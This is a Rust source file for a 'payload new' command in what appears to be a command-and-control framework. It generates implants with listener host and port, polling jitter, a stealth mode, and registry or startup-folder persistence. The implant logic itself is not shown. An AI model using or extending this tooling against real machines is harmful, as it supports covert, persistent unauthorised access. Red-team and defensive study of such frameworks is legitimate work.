use crate::command::*;
use clap::{Arg, ArgMatches, Command as ClapCommand};
use std::any::Any;
use std::path::PathBuf;

use crate::payload::{Payload, PayloadConfig, TransportProtocol, PersistenceMethod};
pub struct PayloadCommand {}

impl RbCommand for PayloadCommand {
    fn name(&self) -> &'static str {
        "payload"
    }

    fn command_type(&self) -> CommandType {
        CommandType::Server
    }

    fn description(&self) -> &'static str {
        "Generate and manage payloads"
    }

    fn parse_args(&self, command_line: &str) -> Result<Box<dyn Any>, clap::Error> {
        // Create the command with subcommands
        let cmd = ClapCommand::new(self.name())
            .about(self.description())
            .subcommand(
                ClapCommand::new("new")
                    .about("Generate a new payload")
                    .arg(
                        Arg::new("lhost")
                            .long("lhost")
                            .help("Listener host")
                            .required(true),
                    )
                    .arg(
                        Arg::new("lport")
                            .long("lport")
                            .help("Listener port")
                            .required(true),
                    )
                    .arg(
                        Arg::new("protocol")
                            .long("protocol")
                            .help("Protocol (http, https)")
                            .default_value("http"),
                    )
                    .arg(
                        Arg::new("poll-interval")
                            .long("poll-interval")
                            .help("Polling interval in seconds")
                            .default_value("5"),
                    )
                    .arg(
                        Arg::new("stealth")
                            .long("stealth")
                            .help("Enable stealth mode")
                            .action(clap::ArgAction::SetTrue),
                    )
                    .arg(
                        Arg::new("persistence")
                            .long("persistence")
                            .help("Persistence method (registry, startup)")
                            .default_value("none"),
                    )
                    .arg(
                        Arg::new("jitter")
                            .long("jitter")
                            .help("Jitter percentage (0-30)")
                            .default_value("0"),
                    ),
            );

        // Get the arguments part (skip the command name)
        let args_str = command_line
            .trim_start()
            .strip_prefix(self.name())
            .unwrap_or("")
            .trim_start();

        // Parse the arguments with owned strings
        let matches = cmd.try_get_matches_from(
            vec![self.name().to_string()]
                .into_iter()
                .chain(args_str.split_whitespace().map(String::from)),
        )?;

        Ok(Box::new(matches))
    }

    fn execute_with_parsed_args(
        &self,
        context: &mut CommandContext,
        args: Box<dyn Any>,
    ) -> CommandResult {
        let matches = args.downcast::<ArgMatches>().unwrap();

        // Handle subcommands
        match matches.subcommand() {
            Some(("new", sub_matches)) => {
                // Extract arguments
                let lhost = sub_matches.get_one::<String>("lhost").unwrap();
                let lport = sub_matches
                    .get_one::<String>("lport")
                    .unwrap()
                    .parse::<u16>()
                    .unwrap_or(8080);
                
                let protocol_str = sub_matches.get_one::<String>("protocol").unwrap();
                let protocol = match protocol_str.as_str() {
                    "https" => TransportProtocol::Https,
                    _ => TransportProtocol::Http,
                };
                
                let poll_interval = sub_matches
                    .get_one::<String>("poll-interval")
                    .unwrap()
                    .parse::<u64>()
                    .unwrap_or(5);
                
                let stealth_mode = sub_matches.get_flag("stealth");
                
                let persistence_str = sub_matches.get_one::<String>("persistence").unwrap();
                let persistence = match persistence_str.as_str() {
                    "registry" => Some(PersistenceMethod::RegistryRun),
                    "startup" => Some(PersistenceMethod::StartupFolder),
                    _ => None,
                };
                
                let jitter = sub_matches
                    .get_one::<String>("jitter")
                    .unwrap()
                    .parse::<u8>()
                    .unwrap_or(0);

                // Create payload config
                let config = PayloadConfig {
                    lhost: lhost.clone(),
                    lport,
                    protocol,
                    poll_interval,
                    stealth_mode,
                    persistence,
                    jitter,
                };

                // Generate the payload
                match Payload::generate_with_config(&config) {
                    Ok(path) => {
                        // Success!
                        CommandResult::Ok(CommandOutput::Text(format!(
                            "Payload generated successfully: {}",
                            path.display()
                        )))
                    }
                    Err(e) => {
                        CommandResult::Err(CommandError::ExecutionFailed(format!(
                            "Failed to generate payload: {}",
                            e
                        )))
                    }
                }
            }
            _ => CommandResult::Err(CommandError::InvalidArguments(
                "Unknown subcommand. Try 'payload new --lhost <HOST> --lport <PORT>'".to_string(),
            )),
        }
    }
}
